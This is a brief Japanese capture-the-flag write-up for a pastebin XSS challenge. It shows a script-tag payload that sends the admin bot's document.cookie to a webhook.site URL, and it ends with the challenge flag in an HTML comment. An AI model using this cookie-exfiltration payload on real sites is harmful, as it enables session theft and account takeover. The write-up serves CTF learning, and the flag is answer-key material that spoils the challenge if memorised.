# Writeup

[pastebin-1.mc.ax](https://pastebin-1.mc.ax/) にアクセスする。

フォームに`<script>`タグを入れてみたところ実行されたので、XSSができることが分かった。

adminのcookieを抜き取りたいので、以下のスクリプトを入力した先のURLを[Admin bot](https://admin-bot.mc.ax/pastebin-1)に踏んでもらう。

```html
<script>window.open('https://webhook.site/4786afe9-a094-44b5-bb0b-9be905b53eb0/?q='+document.cookie);</script>
```

![](img/2021-07-10-15-30-59.png)

<!-- flag{d1dn7_n33d_70_b3_1n_ru57} -->
